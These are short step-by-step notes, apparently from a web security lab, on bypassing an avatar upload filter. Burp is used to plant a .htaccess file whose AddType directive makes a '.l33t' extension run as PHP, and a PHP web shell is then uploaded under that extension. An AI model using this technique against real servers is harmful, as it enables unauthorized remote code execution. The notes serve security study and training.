1. log into profile
2. try to upload avatar
3. get avatar path /files/avatars/<avatar_name>
4. try to load php shell -> get error
5. in burp change avatar upload response
   filename -> .htaccess
   Content-Type -> text/plain
   file content -> AddType application/x-httpd-php .l33t
   This maps an arbitrary extension (.l33t) to the executable MIME type application/x-httpd-php.
   As the server uses the mod_php module, it knows how to handle this already. 
6. upload php shell with extension l33t
7. profit
